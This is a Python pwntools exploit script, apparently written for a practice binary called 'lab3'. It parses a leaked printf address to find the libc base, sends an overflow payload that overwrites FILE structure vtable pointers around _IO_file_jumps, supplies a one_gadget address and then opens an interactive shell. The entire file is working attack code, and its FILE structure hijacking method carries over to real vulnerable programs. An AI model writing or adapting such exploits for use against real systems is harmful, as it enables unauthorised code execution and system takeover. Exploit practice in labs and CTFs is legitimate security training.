from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
b 76
c
c
"""

libc = ELF("./libc.so.6")

if len(sys.argv) > 1:
    p = gdb.debug("./lab3", gdbscript=script, level="debug", env={"LD_PRELOAD": "./libc.so.6"})
else:
    p = process("./lab3", env={"LD_PRELOAD": "./libc.so.6"})

p.recvuntil("Here is a gift for you: 0x")
printf_addr = int(p.recvline().strip(),16)
libc_base = printf_addr - libc.symbols["printf"]
_IO_file_jumps = libc_base + libc.symbols["_IO_file_jumps"]
one_gadget = libc_base + 0xe6c81
log.info(f"printf_addr: {hex(printf_addr)}")
log.info(f"libc_base: {hex(libc_base)}")
log.info(f"_IO_file_jumps: {hex(_IO_file_jumps)}")
log.info(f"one_gadget: {hex(one_gadget)}")

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "2")

pl = flat(
    "A"*0x210,
    0, 0,
    0, 0,
    0, 0,
    0, _IO_file_jumps+0x20,
    _IO_file_jumps+0x28, 0,
    0, 0,
    0, 0,
    0
)

p.sendlineafter("data> ", pl)
p.sendlineafter("> ", "4")
p.sendline(p64(one_gadget))

p.interactive()
